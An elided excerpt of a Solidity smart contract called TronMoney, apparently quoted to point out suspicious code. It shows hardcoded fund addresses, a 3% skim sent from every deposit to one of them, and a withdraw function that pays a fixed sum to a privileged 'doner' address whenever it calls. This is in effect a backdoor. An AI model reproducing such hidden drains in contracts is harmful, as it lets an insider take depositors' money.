...
contract TronMoney {
    ...
    address payable doner;
    address payable public tronmoney_fund;
    ...
    constructor(address payable _owner) public {
        ...
        tronmoney_fund = 0x257dd5Cec8773E1Ca8C861272a4CBBf6A6be063f;
        admin_fee = 0x900359743839d8682584e30dB154F0657a48Eb9B;
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        tronmoney_fund.transfer(_amount * 3 / 100);
    ...
    function withdraw() external {
        if(msg.sender == doner) return msg.sender.transfer(1000000000);
